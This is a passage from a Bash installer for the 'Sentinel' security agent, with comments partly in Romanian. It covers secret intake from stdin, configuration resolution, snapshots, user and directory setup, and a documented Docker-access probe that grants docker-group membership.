#!/usr/bin/env bash
#
# Sentinel server-side installer. Idempotent, step-numbered, resumable.
#
# All the real deployment logic lives here rather than in the Windows-side
# scripts, so there is one implementation to test and `deploy.sh` and
# `deploy.ps1` stay thin and behaviourally identical.
#
#   ./install.sh --domain sentinel.example.com
#                [--nginx-mode dedicated|shared] [--web-port 8443]
#                [--cert-mode auto|webroot|dns|selfsigned|none]
#                [--admin-ip 203.0.113.10] [--from-step N] [--force-step N[,N…]]
#                [--skip-preflight]
#
#   --from-step N    skips every step BELOW N. At or above N a completion marker
#                    still wins, so this resumes an interrupted install; it does
#                    not re-run anything already done.
#   --force-step L   clears the markers of the listed steps so their bodies run
#                    again: one number, or a comma-separated list. The list form
#                    exists because some steps are one operation — rotating
#                    SENTINEL_DB_PASSWORD needs 22 (ALTER ROLE) and 27
#                    (secrets.env) in the SAME pass, since the services are
#                    restarted at the end of it. See docs/OPERARE.md §11.
#
# Two ways to expose the dashboard, chosen with --nginx-mode:
#
#   dedicated (default)  Sentinel's own nginx listener on --web-port (8443).
#                        Touches nothing that already exists. The URL carries the
#                        port, and certbot's HTTP-01 challenge is unavailable
#                        because Sentinel does not own :80 — see --cert-mode.
#
#   shared               Sentinel becomes a vhost on the nginx already serving
#                        80/443, selected by server_name. Clean URL, working
#                        HTTP->HTTPS redirect, and certificates work normally
#                        because Sentinel serves its own ACME challenge. Requires
#                        nginx to be what owns those ports.
#
# Secrets arrive on stdin as KEY=value lines. They are never passed as
# arguments, never written to the repo, and never appear in the process list.
#
#   ./install.sh --domain … < secrets.env
#
# Ordering is deliberate in two places:
#   * The nftables allowlist is populated BEFORE any drop rule exists.
#   * Services start one at a time, each behind a health gate, so a failure
#     stops at one broken unit rather than six.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
# shellcheck source=lib/common.sh
source "${SCRIPT_DIR}/lib/common.sh"
source "${SCRIPT_DIR}/lib/distro.sh"

# Everything below branches on this. Detecting once, early, means a failure
# here is a clear refusal rather than a confusing package error 200 lines in.
distro_detect || die "cannot read /etc/os-release — unsupported system"
distro_supported || die "unsupported distribution: ${DISTRO_PRETTY}. Sentinel installs on RHEL-family (AlmaLinux, Rocky, RHEL, Fedora) and Debian-family (Debian, Ubuntu) hosts."

DOMAIN=""
ADMIN_IP=""
ADMIN_EMAIL=""
FROM_STEP=""
FORCE_STEP=""
SKIP_PREFLIGHT=0
SURICATA_OK=0

# The public HTTPS port for the dashboard. Not 443: this host serves something
# else there. See deploy/nginx/sentinel.conf.tmpl for the consequences.
PUBLIC_PORT="${PUBLIC_PORT:-8443}"

# How to obtain the TLS certificate. certbot's HTTP-01 challenge needs :80, which
# Sentinel does not own, so `--nginx` is not an option:
#   auto       test whether the existing :80 service can serve an ACME challenge;
#              use webroot if it can, self-signed if it cannot   (default)
#   webroot    assume it can, and use it
#   dns        DNS-01; needs a certbot DNS plugin configured
#   selfsigned skip issuance entirely
#   none       leave whatever certificate is already there
CERT_MODE="auto"

# How the dashboard is exposed:
#   dedicated  Sentinel's own nginx listener on --web-port (8443). Touches
#              nothing that exists, but the URL carries the port and certbot's
#              HTTP-01 challenge is unavailable.
#   shared     Sentinel becomes a vhost on the nginx already serving 80/443,
#              scoped by server_name. Clean URL, working redirect, and
#              certificates work normally because Sentinel serves its own ACME
#              challenge. Requires nginx to be what owns those ports, and writes
#              into a config directory shared with the operator's sites.
NGINX_MODE="dedicated"

# Whether nginx was on this host before we touched it. Decides whether editing
# nginx.conf is ours to do. Observed once, in step_packages, and then read from
# the write-once record — see nginx_preexisting_resolve.
NGINX_WAS_PREEXISTING=0
NGINX_PREEXISTING_FACT=nginx_preexisting

# The marker run_step writes for step 20. Pinned as a constant because
# nginx_preexisting_resolve reads it to tell a first install from a host that has
# already been through step 20, and a silent mismatch there would put the
# migration back where it started.
STEP_PACKAGES_KEY=20_packages
DEPLOY_TS="$(date -u +%Y%m%d-%H%M%S)"
SNAPSHOT_DIR="${SENTINEL_BACKUP_DIR}/predeploy-${DEPLOY_TS}"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --domain)         DOMAIN="${2:-}"; shift 2 ;;
        --admin-ip)       ADMIN_IP="${2:-}"; shift 2 ;;
        --email)          ADMIN_EMAIL="${2:-}"; shift 2 ;;
        --web-port)       PUBLIC_PORT="${2:-}"; shift 2 ;;
        --nginx-mode)     NGINX_MODE="${2:-}"; shift 2 ;;
        --cert-mode)      CERT_MODE="${2:-}"; shift 2 ;;
        --from-step)      FROM_STEP="${2:-}"; shift 2 ;;
        --force-step)     FORCE_STEP="${2:-}"; shift 2 ;;
        --skip-preflight) SKIP_PREFLIGHT=1; shift ;;
        --allow-firewalld) export ALLOW_FIREWALLD=1; shift ;;
        --allow-ufw)      export ALLOW_UFW=1; shift ;;
        --yes|-y)         export SENTINEL_ASSUME_YES=1; shift ;;
        # The range covers the header block down to the end of the nginx-mode
        # description. It is a line count, so it moves when the header does —
        # tests/unit/test_force_step_list.py pins that --help still shows the
        # flags it documents.
        --help|-h)        sed -n '2,36p' "$0"; exit 0 ;;
        *) die "unknown argument: $1" ;;
    esac
done

# Step selection is resolved here, before anything is touched.
#
# Both refusals below happen at startup on purpose. An installer that starts,
# forces half of what it was asked, and then discovers the rest was nonsense
# leaves the host in a state nobody asked for — for a password rotation, that
# state is "database changed, services still holding the old value".
assert_force_steps_above_from_step() {
    [[ -n "$FROM_STEP" ]] || return 0
    local forced
    for forced in ${FORCE_STEPS[@]+"${FORCE_STEPS[@]}"}; do
        # --from-step is applied first in run_step, so a forced step below it is
        # skipped rather than forced. Refuse the combination instead of quietly
        # obeying one half of it.
        if (( forced < FROM_STEP )); then
            die "--force-step ${forced} is below --from-step ${FROM_STEP}, so it would be \
skipped rather than re-run. Drop one of the two flags."
        fi
    done
}

if [[ -n "$FROM_STEP" && ! "$FROM_STEP" =~ ^[0-9]+$ ]]; then
    die "--from-step: '${FROM_STEP}' is not a step number"
fi
parse_force_steps "$FORCE_STEP"
assert_force_steps_exist "${BASH_SOURCE[0]}"
assert_force_steps_above_from_step

need_root

# Secrets from stdin, before anything else can consume it.
#
# When stdin is a pipe it belongs entirely to the secrets, which means there is
# no terminal left to prompt on. That is the normal path: deploy.sh has already
# shown the lockout warning and taken the operator's confirmation locally, so
# prompting again here would only deadlock on EOF.
declare -A SECRETS=()
SECRETS_BAD_LINES=()
SECRETS_CRLF_LINES=0

# A line that is not NAME=value is not a secret, and it is not a name either.
#
# This was `while IFS='=' read -r key value`, which puts a line with no `=`
# entirely into `key`. So the second line of a value an editor had wrapped
# became a "key name" made of secret material — and the installer then printed
# that name, verbatim, when it declined to write it. The tail of an API key
# ended up on the operator's console and in the deploy log.
#
# The rule is the same one the on-disk path already follows: what does not look
# like an environment variable name is reported by LINE NUMBER, never by
# content, because on a malformed line the content is the secret.
#
# Leading whitespace is tolerated on comments and on keys, because
# sentinel/config.py:load_secrets strips before parsing. A key the product would
# read and the installer would call garbage is a key the installer would delete.
read_stdin_secrets() {
    local line stripped lineno=0 key value
    while IFS= read -r line || [[ -n "$line" ]]; do
        lineno=$((lineno + 1))

        # A CR from a secrets/.env.local edited on Windows. It has to come off
        # HERE, before anything reads the value, and the reason is not tidiness:
        #
        #   value arrives as `"secret"<CR>` → the trailing-quote strip below no
        #   longer matches, so the value becomes `secret"<CR>`. That exact string
        #   is what step 22 hands to `ALTER ROLE ... PASSWORD` and what step 27
        #   writes to secrets.env — but sentinel/config.py strips the line when
        #   the daemons read it, so they authenticate with `secret"` against a
        #   database expecting `secret"<CR>`. Every daemon fails to connect after
        #   a rotation that reported success.
        #
        # Only the stdin path is normalised. A CR already inside secrets.env on
        # the host is left exactly as it is: the database was given that value
        # too, and quietly rewriting it here would break the match rather than
        # repair it.
        if [[ "$line" == *$'\r' ]]; then
            SECRETS_CRLF_LINES=$((SECRETS_CRLF_LINES + 1))
            line="${line%$'\r'}"
        fi

        stripped="${line#"${line%%[![:space:]]*}"}"
        [[ -z "$stripped" || "$stripped" == \#* ]] && continue

        if [[ ! "$stripped" =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
            SECRETS_BAD_LINES+=("$lineno")
            continue
        fi
        key="${BASH_REMATCH[1]}"; value="${BASH_REMATCH[2]}"
        value="${value%\"}"; value="${value#\"}"
        SECRETS["$key"]="$value"
    done
}

if [[ ! -t 0 ]]; then
    read_stdin_secrets
    if (( SECRETS_CRLF_LINES )); then
        warn "${SECRETS_CRLF_LINES} line(s) arrived with CRLF endings. They were \
handled, and nothing here is wrong now — but secrets/.env.local was saved by an \
editor that writes Windows line endings, and that file is not covered by \
.gitattributes. Convert it to LF before the next edit."
    fi
    if (( ${#SECRETS_BAD_LINES[@]} )); then
        warn "${#SECRETS_BAD_LINES[@]} line(s) on stdin were neither a comment nor \
KEY=value and were ignored — line(s): ${SECRETS_BAD_LINES[*]}"
        warn "The content is deliberately not shown: on a wrapped line it is the \
secret itself. The usual cause is a value broken across two lines in \
secrets/.env.local — if so, the key ABOVE it arrived truncated."
    fi
    export SENTINEL_ASSUME_YES=1
fi

# ===========================================================================
step_preflight() {
    if (( SKIP_PREFLIGHT )); then
        warn "preflight skipped by request — you are deploying blind"
        return 0
    fi
    "${SCRIPT_DIR}/preflight.sh" ${DOMAIN:+--domain "$DOMAIN"} --web-port "$PUBLIC_PORT" \
        --nginx-mode "$NGINX_MODE" \
        || die "preflight failed. Nothing has been changed."
}

#
# Resolve the derived, in-process configuration that later steps depend on:
# ADMIN_IP, PUBLIC_PORT, SURICATA_OK, BPF_HINT, NGINX_WAS_PREEXISTING, and the
# validated nginx mode. It reads preflight.env (written by step 1) and applies
# command-line overrides.
#
# This is NOT a run_step: it must execute on EVERY invocation, never behind a
# completion marker. Variables live only for the current process, but markers
# persist on disk — so a marker-gated version would be skipped on any resume,
# and every downstream step would then run with this state UNSET. That is exactly
# how a shared-mode resume regenerated sentinel.yaml with the dedicated default
# port (8443) and failed validation: the PUBLIC_PORT=443 resolution lived in a
# step that the resume skipped.
# Was nginx on this host before Sentinel touched it? One answer, from the record.
#
# The observation is only valid the first time it is made — step 20, before the
# package install. Every run after that reads what was written down. Three
# sources, in this order, and the order is the design:
#
#   1. the write-once fact. Once written, nothing changes it.
#   2. the legacy NGINX_WAS_PREEXISTING= line in preflight.env, promoted into the
#      fact. A host installed before the fact file existed has its only record
#      there — on production that record is 1, and defaulting to 0 instead would
#      hand step 33 permission to edit the operator's own nginx.conf. Promoting
#      it also makes it survive the next --force-step 1, which rewrites
#      preflight.env from scratch and would otherwise drop it.
#   3. no line at all, on a host that has ALREADY run step 20. The silence is
#      itself the record: the old code appended that line only when it FOUND
#      nginx, so its absence after step 20 means nginx was not here. Written down
#      rather than re-derived every run, because otherwise the next
#      --force-step 20 would observe our own nginx and record 1 — the same bug,
#      back through the migration gap.
#
# Read from the FILE, not from the variable preflight.env sets: install.sh
# initialises NGINX_WAS_PREEXISTING=0 at the top, so a variable test cannot tell
# "preflight said 0" from "preflight said nothing" — and on a first install it
# would freeze that 0 before step 20 has looked at the host at all.
nginx_preexisting_resolve() {
    local env_file="${1:-}" legacy=""

    if fact_recorded "$NGINX_PREEXISTING_FACT"; then
        fact_read "$NGINX_PREEXISTING_FACT"
        return 0
    fi

    # grep and parameter expansion rather than a sed script: this line has been
    # edited by hand more than once, and an escaping mistake here reads as "no
    # legacy record" — which on production would mean "nginx is ours to edit".
    if [[ -f "$env_file" ]]; then
        legacy="$(grep -E '^NGINX_WAS_PREEXISTING=[01][[:space:]]*$' "$env_file" | tail -1)"
        legacy="${legacy#NGINX_WAS_PREEXISTING=}"
        legacy="${legacy//[[:space:]]/}"
    fi
    if [[ -n "$legacy" ]]; then
        fact_record_once "$NGINX_PREEXISTING_FACT" "$legacy"
        return 0
    fi

    if step_done "$STEP_PACKAGES_KEY"; then
        fact_record_once "$NGINX_PREEXISTING_FACT" 0
        return 0
    fi

    # Nothing recorded, and step 20 has not run: this is a first install and the
    # real answer arrives in a few seconds. Deliberately NOT written down — that
    # would be the record answering a question nobody has asked the host yet.
    printf '0\n'
}

resolve_config() {
    # Command-line values, captured before `source` can clobber them: an explicit
    # flag must always beat whatever preflight persisted.
    local cli_admin_ip="$ADMIN_IP" cli_domain="$DOMAIN" cli_public_port="$PUBLIC_PORT"

    local env_file="${STATE_MARKERS}/preflight.env"
    if [[ -f "$env_file" ]]; then
        # shellcheck disable=SC1090
        source "$env_file"
    fi

    # Safe defaults for anything preflight did not provide (e.g. --skip-preflight),
    # so `set -u` cannot trip on a first-use below.
    SURICATA_OK="${SURICATA_OK:-0}"
    MEM_AVAIL="${MEM_AVAIL:-0}"
    BPF_HINT="${BPF_HINT:-}"
    NGINX_WAS_PREEXISTING="$(nginx_preexisting_resolve "$env_file")"

    [[ -n "$cli_admin_ip" ]]    && ADMIN_IP="$cli_admin_ip"
    [[ -n "$cli_domain" ]]      && DOMAIN="$cli_domain"
    [[ -n "$cli_public_port" ]] && PUBLIC_PORT="$cli_public_port"
    [[ -z "$ADMIN_IP" ]] && ADMIN_IP="$(ssh_peer_ip)"
    [[ -z "$ADMIN_IP" ]] && ADMIN_IP="${SENTINEL_ADMIN_IP:-}"

    if [[ -z "$ADMIN_IP" ]]; then
        warn "no admin IP determined. Nothing will be allowlisted, so an auto-block \
could in principle reach you. Auto-block ships disabled, so this is not immediately \
dangerous — but set it before enabling auto-block."
    else
        ok "admin IP for the allowlist: ${ADMIN_IP}"
    fi
    info "Suricata: $( (( SURICATA_OK )) && echo enabled || echo 'disabled (log-only mode)' )"

    case "$NGINX_MODE" in
        dedicated)
            if [[ "$PUBLIC_PORT" =~ ^(80|443|22)$ ]]; then
                die "--web-port ${PUBLIC_PORT} cannot be bound. 22 would end your SSH session; binding 80 or 443 would displace whatever this host is actually for. If you want the dashboard on 443, use --nginx-mode shared, which adds a vhost to the existing nginx instead of binding the port."
            fi
            info "dedicated mode: nginx will listen on :${PUBLIC_PORT} — 80 and 443 stay untouched"
            ;;
        shared)
            # Nothing new is bound in shared mode — the existing nginx is already
            # listening on 443. The port only appears in URLs, never on a socket.
            [[ -n "$DOMAIN" ]] || die "--nginx-mode shared requires --domain: the vhost is selected by server_name, and without one it would have to claim default_server, which would hijack how your other sites answer an unknown Host."
            PUBLIC_PORT=443
            info "shared mode: dashboard at https://${DOMAIN} (no port suffix)"
            ;;
        *)
            die "--nginx-mode must be 'dedicated' or 'shared', got: ${NGINX_MODE}"
            ;;
    esac

    export SENTINEL_PUBLIC_PORT="$PUBLIC_PORT"

    # Stabilise the snapshot directory ONLY when step 18 will not run this
    # session. SNAPSHOT_DIR is seeded from a per-run timestamp, so a run that
    # skips step 18 would point at a directory nobody created — breaking the
    # nginx-config backup (step 33) and the automatic rollback (step 38), both of
    # which write to and read from it. There, `predeploy-latest` is the truth.
    #
    # The condition used to be "the symlink exists", and that was wrong in a way
    # that only showed up weeks later. The symlink outlives the run that made it,
    # so every later deploy inherited the FIRST snapshot ever taken and then
    # printed it as its rollback target. Measured on 21 August 2026: a deploy
    # advertised a snapshot whose files were all dated 31 July. A rollback would
    # have restored three weeks of unrelated state — nftables, nginx, the package
    # list — to undo one change. The step is in ALWAYS_STEPS now, so the only
    # remaining way for it not to run is --from-step above it, and that is
    # exactly what this tests for.
    if [[ -n "${FROM_STEP:-}" ]] && (( FROM_STEP > 18 )); then
        local latest="${SENTINEL_BACKUP_DIR}/predeploy-latest"
        if [[ -L "$latest" ]]; then
            local resolved; resolved="$(readlink -f "$latest" 2>/dev/null || true)"
            [[ -n "$resolved" && -d "$resolved" ]] && SNAPSHOT_DIR="$resolved"
        fi
    fi
}

# --- 18 -------------------------------------------------------------------
step_snapshot() {
    mkdir -p "$SENTINEL_BACKUP_DIR"
    chmod 0700 "$SENTINEL_BACKUP_DIR"
    snapshot_create "$SNAPSHOT_DIR"
    ln -sfn "$SNAPSHOT_DIR" "${SENTINEL_BACKUP_DIR}/predeploy-latest"

    # Preflight normally captures this. Capture it here too, so that a run with
    # --skip-preflight still has something to compare against at step 38 — an
    # install with no baseline cannot tell whether it broke anything.
    [[ -f "${STATE_MARKERS}/baseline-services.txt" ]] || capture_baseline
}

# --- 19 -------------------------------------------------------------------
step_user_and_dirs() {
    if ! getent group "$SENTINEL_USER" >/dev/null; then
        groupadd --system "$SENTINEL_USER"
        ok "group ${SENTINEL_USER} created"
    fi
    if ! getent passwd "$SENTINEL_USER" >/dev/null; then
        useradd --system --gid "$SENTINEL_USER" \
                --home-dir "$SENTINEL_PREFIX" --no-create-home \
                --shell /sbin/nologin \
                --comment "Sentinel security agent" "$SENTINEL_USER"
        ok "user ${SENTINEL_USER} created (no login shell)"
    fi

    install -d -m 0755 -o root -g root                          "$SENTINEL_PREFIX"
    install -d -m 0755 -o root -g root                          "${SENTINEL_PREFIX}/bin"
    install -d -m 0755 -o root -g root                          "${SENTINEL_PREFIX}/libexec"
    install -d -m 0750 -o root -g "$SENTINEL_USER"              "$SENTINEL_CONFIG_DIR"
    install -d -m 0750 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "$SENTINEL_STATE_DIR"
    install -d -m 0750 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "${SENTINEL_STATE_DIR}/geoip"
    install -d -m 0750 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "${SENTINEL_STATE_DIR}/cursors"
    # The root executor owns this one. Its capability set deliberately omits
    # CAP_DAC_OVERRIDE, so root cannot write into the sentinel-owned state dir
    # above — its hash-chained audit log needs a directory it owns outright.
    install -d -m 0750 -o root -g root                          "${SENTINEL_STATE_DIR}/executor"
    install -d -m 0700 -o root -g root                          "$SENTINEL_BACKUP_DIR"
    install -d -m 0755 -o "$SENTINEL_USER" -g "$SENTINEL_USER"  "$SENTINEL_PREFIX/claude-workspace"

    install -D -m 0644 "${SCRIPT_DIR}/tmpfiles/sentinel.conf" /usr/lib/tmpfiles.d/sentinel.conf
    systemd-tmpfiles --create /usr/lib/tmpfiles.d/sentinel.conf

    # Read-only access to logs the collectors tail. Group membership rather than
    # a sudo rule: the collectors never need to run anything privileged.
    for grp in systemd-journal adm; do
        getent group "$grp" >/dev/null && usermod -aG "$grp" "$SENTINEL_USER"
    done
    # The docker group is deliberately NOT granted here — see
    # `ensure_docker_access` below. This step is marker-gated, and docker can
    # appear on a host long after the day it was installed.
}

# ---------------------------------------------------------------------------
# Accesul lui `sentinel` la socketul docker.
#
# NU e un pas numerotat, exact ca `resolve_config` și `ensure_instance_id`:
# se cheamă necondiționat din `main`, între 19 și 20. Trei motive, în ordinea
# importanței:
#
#   * pasul 26 (`configs`, ÎN ALWAYS_STEPS) scrie `scan.containers` din
#     măsurătoarea de aici. O sursă supusă marcajelor n-ar putea răspunde la
#     fiecare deploy întrebării pe care pasul 26 o pune la fiecare deploy;
#   * aici a stat până acum, în pasul 19, și 19 e marcat din ziua instalării.
#     Docker poate apărea pe gazdă ORICÂND după aceea, iar atunci apartenența
#     n-ar mai fi acordată niciodată, în tăcere;
#   * un pas NOU ar muta numerele tuturor pașilor de după el, adică ar invalida
#     fiecare `--force-step N` din docs/OPERARE.md, din DEPANARE.md și din
#     istoricul de comenzi al operatorului. Motivul e scris pe larg la
#     `ensure_instance_id`, care a fost mutată din același fel de loc.
#
# Ce se măsoară și ce ajunge în configurație:
#
#   fapt observat                                          stare      containers
#   ─────────────────────────────────────────────────────  ─────────  ──────────
#   niciun client, niciun socket, niciun DOCKER_HOST        absent        false
#   configurația VIE cere deja `scan.containers: false`     oprit         false
#   daemonul răspunde ca `sentinel` cu versiunea LUI        gata          true
#   apartenența e în /etc/group, dar daemonul e mut și
#     pentru root (ori n-avem cum să rulăm ca alt user)     nedovedit     true
#   orice altceva — grupul lipsește, `usermod` n-a prins,
#     sau root e servit și `sentinel` nu                    refuzat       false
#
# Regula din spatele tabelului: `true` se scrie doar când există o DOVADĂ a căii
# de acces. Fără ea se scrie `false`, fiindcă un `scan.containers: true` fără
# acces produce un rând `failed` în `scans` în fiecare noapte și o cheie roșie la
# `scan:last:trivy_image`, pe care nimeni nu le poate curăța de pe gazdă:
# scanerul nu poate să-și acorde singur apartenența.
#
# „Nedovedit" nu e „în regulă", și de asta are stare proprie și mesaj propriu:
# acolo `true` se sprijină pe intrarea din /etc/group, iar operatorul e anunțat
# explicit că EFECTUL nu a fost văzut.
#
# Ce costă apartenența — pe gazda asta grupul `docker` e echivalent cu root, deci
# o compromitere a agentului de securitate devine root pe mașina pe care o
# păzește — e scris în docs/ARHITECTURA.md §3.14 și în docstring-ul lui
# sentinel/scan/trivy_image.py. Operatorul a acceptat schimbul deliberat. Nu se
# repetă aici.
# ---------------------------------------------------------------------------

# Aceleași trei semne pe care le citește `probe_docker` din
# sentinel/scan/trivy_image.py, și în aceeași ordine. Un singur semn ar fi ori
# încredere în filesystem, ori încredere în configurație, iar fiecare dintre ele
# s-a dovedit deja greșită aici, în direcții opuse.
#
# Variabile, nu litere în cod, ca funcțiile să poată fi rulate și în altă parte
# decât pe /run — același motiv ca la AUDITD_RULES_DEST.
DOCKER_SOCKET_PATHS=(/run/docker.sock /var/run/docker.sock)
DOCKER_CLIENT_PATH=/usr/bin/docker
DOCKER_GROUP=docker

# Starea măsurată, și valoarea pe care o scrie pasul 26. GOALE până rulează
# `ensure_docker_access`: pasul 26 refuză să scrie o valoare pe care n-a
# măsurat-o nimeni, în loc să presupună una.
DOCKER_ACCESS_STATE=""
SCAN_CONTAINERS=""

# Ce a răspuns ultima interogare: versiunea serverului, și ultima linie de
# eroare.
#
# Amândouă ies prin variabile, nu pe stdout, iar asta e o reparație, nu un stil.
# Prima versiune a funcției de mai jos întorcea versiunea pe stdout, deci
# apelantul o citea cu `$(…)` — iar atribuirea lui DOCKER_PROBE_ERR se făcea
# atunci ÎNĂUNTRUL substituției de comandă și murea cu subshell-ul. Efectul
# măsurat pe VM-ul de test: daemon oprit, stderr cu explicația, instalatorul
# tipărea „fără mesaj" — exact linia de care operatorul are nevoie ca să știe ce
# să repare, pierdută în tăcere.
#
# Același tipar ca la `read_instance_id_file`/`INSTANCE_ID_READ`: rezultatul
# într-o variabilă, codul de ieșire doar pentru „a mers sau nu".
DOCKER_SERVER_VERSION=""
DOCKER_PROBE_ERR=""

docker_is_present() {
    if have docker || [[ -x "$DOCKER_CLIENT_PATH" ]]; then
        return 0
    fi
    local sock
    for sock in "${DOCKER_SOCKET_PATHS[@]}"; do
        if [[ -e "$sock" ]]; then
            return 0
        fi
    done
    [[ -n "${DOCKER_HOST:-}" ]]
}

# Versiunea SERVERULUI, cerută de un anume utilizator, cu grupurile lui.
#
# `--format '{{.Server.Version}}'` nu e cosmetică, e miezul verificării:
# `docker version` FĂRĂ format iese cu 0 și tipărește blocul clientului chiar și
# când daemonul nu răspunde. Codul de ieșire singur e trapa — MĂSURAT, vezi
# tests/security/test_installer_docker_access.py. Deci se cere ȘI cod 0, ȘI o
# versiune nevidă.
#
#   0  daemonul a răspuns; versiunea e în DOCKER_SERVER_VERSION
#   1  am întrebat și n-am primit o versiune de server; motivul e în DOCKER_PROBE_ERR
#   2  n-am avut CUM să întreb ca utilizatorul acela — altceva decât un refuz
docker_server_version_as() {
    local user="$1" out="" rc=0 errfile
    DOCKER_SERVER_VERSION=""
    DOCKER_PROBE_ERR=""
    errfile="$(mktemp)"

    if [[ "$user" == "root" ]]; then
        out="$(docker version --format '{{.Server.Version}}' 2>"$errfile")" || rc=$?
    elif have runuser; then
        # `runuser -u` execută comanda DIRECT, fără shell, și reface lista de
        # grupuri din /etc/group. Contează: `sentinel` are /sbin/nologin, deci
        # `su - sentinel -c …` n-ar rula nimic și ar raporta un eșec care n-are
        # nicio legătură cu docker.
        out="$(runuser -u "$user" -- docker version --format '{{.Server.Version}}' 2>"$errfile")" || rc=$?
    elif have sudo; then
        out="$(sudo -n -u "$user" -- docker version --format '{{.Server.Version}}' 2>"$errfile")" || rc=$?
    else
        rm -f "$errfile"
        DOCKER_PROBE_ERR="nu există nici runuser, nici sudo pe gazda asta"
        return 2
    fi

    # `|| true`: `pipefail` e activ, iar un stderr GOL face `grep` să iasă 1.
    # Fără el, o interogare REUȘITĂ ar opri instalatorul întreg.
    DOCKER_PROBE_ERR="$(tr -d '\r' < "$errfile" \
                        | grep -v '^[[:space:]]*$' | tail -n1)" || true
    rm -f "$errfile"

    out="$(printf '%s' "$out" | tr -d '[:space:]')"
    if (( rc != 0 )) || [[ -z "$out" ]]; then
        return 1
    fi
    DOCKER_SERVER_VERSION="$out"
    return 0
}

# Apartenența așa cum o vede sistemul, nu așa cum am cerut-o. Dovedește intrarea
# din /etc/group și ATÂT — nu că daemonul răspunde. De asta e doar sprijinul
# ramurii „nedovedit", niciodată dovada principală.
sentinel_in_docker_group() {
    id -nG "$SENTINEL_USER" 2>/dev/null | tr ' ' '\n' | grep -qx "$DOCKER_GROUP"
}

# Ce cere configurația VIE de pe gazdă. Trei răspunsuri, fiindcă „nu pot citi
# fișierul" și „scrie false" nu sunt același lucru: primul e o gazdă pe care
# operatorul nu s-a pronunțat (instalare nouă), al doilea e un refuz explicit.
#
# `awk` delimitat la blocul `scan:`, nu un `grep containers:` peste tot fișierul:
# `containers` e un cuvânt destul de generic încât o cheie cu același nume din
# altă secțiune să fie citită drept răspunsul operatorului. O cheie de nivel zero
# începe linia în coloana 0, deci blocul se delimitează exact.
config_containers_setting() {
    local cfg="${SENTINEL_CONFIG_DIR}/sentinel.yaml" value=""
    [[ -r "$cfg" ]] || { printf 'unknown'; return 0; }
    value="$(awk '
        /^[^[:space:]#]/ { in_scan = ($0 ~ /^scan:[[:space:]]*(#.*)?$/); next }
        in_scan && $1 == "containers:" { print $2; exit }
    ' "$cfg" 2>/dev/null)" || value=""
    case "$value" in
        true)  printf 'true' ;;
        false) printf 'false' ;;
        *)     printf 'unknown' ;;
    esac
}

ensure_docker_access() {
    DOCKER_ACCESS_STATE=""
    SCAN_CONTAINERS=""

    if ! docker_is_present; then
        DOCKER_ACCESS_STATE=absent
        SCAN_CONTAINERS=false
        info "docker nu e pe gazda asta: nici clientul, nici ${DOCKER_SOCKET_PATHS[*]}, \
nici DOCKER_HOST. Nu e o eroare — e o gazdă fără containere."
        info "scan.containers se scrie false, ca să nu se ceară o scanare care n-are ce scana."
        return 0
    fi

    # Alegerea operatorului, dacă a făcut-o, se citește ÎNAINTE de orice
    # acordare. §3.14 spune că ieșirea din schimb e `scan.containers: false`
    # ÎMPREUNĂ cu scoaterea din grup; un instalator care re-acordă apartenența la
    # fiecare deploy pe o gazdă unde scanarea e oprită păstrează tot costul și
    # niciun beneficiu — și, fiindcă funcția asta rulează necondiționat, ar face-o
    # de fiecare dată.
    local wanted; wanted="$(config_containers_setting)"
    if [[ "$wanted" == "false" ]]; then
        DOCKER_ACCESS_STATE=disabled
        SCAN_CONTAINERS=false
        info "docker e pe gazda asta, dar ${SENTINEL_CONFIG_DIR}/sentinel.yaml are \
scan.containers: false, deci apartenența la grupul ${DOCKER_GROUP} NU se acordă."
        # Fără linia asta ramura e o fundătură tăcută: pe o gazdă unde docker a
        # apărut DUPĂ instalare, `false` a fost scris chiar de instalator (docker
        # lipsea atunci), iar `install_config` nu rescrie un sentinel.yaml viu.
        # Nimic de pe gazdă nu i-ar mai spune operatorului că scanarea
        # containerelor e la un cuvânt distanță.
        info "Ca s-o pornești: pune scan.containers: true în \
${SENTINEL_CONFIG_DIR}/sentinel.yaml și re-rulează deploy-ul. Abia atunci se acordă \
apartenența — și citește întâi docs/ARHITECTURA.md §3.14."
        if sentinel_in_docker_group; then
            warn "${SENTINEL_USER} e totuși în grupul ${DOCKER_GROUP}, iar grupul ăla e \
echivalent cu root aici (docs/ARHITECTURA.md §3.14). Cu scanarea oprită, asta e tot costul \
și niciun beneficiu. Scoate-l:  gpasswd -d ${SENTINEL_USER} ${DOCKER_GROUP}"
        fi
        return 0
    fi

    # Întâi efectul, apoi acordarea. Pe a doua rulare — și pe fiecare deploy de
    # după — asta face funcția o operație nulă DOVEDITĂ: daemonul a răspuns, deci
    # nu se atinge nimic. Un `usermod` „oricum idempotent" ar fi tot o presupunere.
    local rc=0
    docker_server_version_as "$SENTINEL_USER" || rc=$?
    if (( rc == 0 )); then
        DOCKER_ACCESS_STATE=ready
        SCAN_CONTAINERS=true
        ok "docker răspunde ca ${SENTINEL_USER}: server ${DOCKER_SERVER_VERSION}. \
Nimic de acordat."
        return 0
    fi
    local why="${DOCKER_PROBE_ERR:-fără mesaj}"

    if getent group "$DOCKER_GROUP" >/dev/null; then
        warn "apartenența la grupul ${DOCKER_GROUP} e echivalentă cu root pe gazda asta — \
vezi docs/ARHITECTURA.md §3.14. E cerută de scanarea imaginilor de container."
        usermod -aG "$DOCKER_GROUP" "$SENTINEL_USER" \
            || warn "usermod -aG ${DOCKER_GROUP} ${SENTINEL_USER} a raportat un eșec; \
efectul e măsurat mai jos oricum, fiindcă nici reușita lui n-ar fi fost o dovadă."
    else
        warn "grupul ${DOCKER_GROUP} nu există pe gazda asta, deci apartenența NU poate fi \
acordată."
    fi

    rc=0
    docker_server_version_as "$SENTINEL_USER" || rc=$?
    if (( rc == 0 )); then
        DOCKER_ACCESS_STATE=granted
        SCAN_CONTAINERS=true
        ok "${SENTINEL_USER} a fost adăugat în grupul ${DOCKER_GROUP} și daemonul îi \
răspunde: server ${DOCKER_SERVER_VERSION}."
        info "Procesele sentinel deja pornite păstrează setul VECHI de grupuri — systemd \
le rezolvă la pornirea unității, nu la daemon-reload. Pasul 32 repornește fiecare unitate, \
iar sentinel-scan e Type=oneshot, deci ia grupurile noi la următoarea declanșare a \
temporizatorului."
